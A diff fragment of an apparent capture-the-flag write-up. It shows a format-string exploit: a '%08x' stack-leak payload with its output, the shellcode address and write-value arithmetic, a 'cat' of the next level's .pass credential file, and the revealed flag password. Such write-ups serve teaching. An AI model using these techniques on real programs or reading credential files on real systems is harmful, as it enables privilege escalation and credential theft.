@@ -54,7 +54,7 @@ aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%
 => aaaa00000064.f7fcfac0.f7ec3af9.ffffd6df.ffffd6de.00000000.ffffffff.ffffd764.f7fdb000.61616161.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838
 ```                              
 
-- a value is 61
+- char `a` value is 61
 - We then find that printf argument position is at 10th position
 
 - The shellcode address(0xffffdeae) in decimal is 4294958766 
@@ -89,6 +89,8 @@ second value is : 65535 - 56998 - 8 = 8529
 
 And we can get the flag !
 ```
+whoami
+level06
 cat /home/users/level06/.pass
 ```
 =>h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
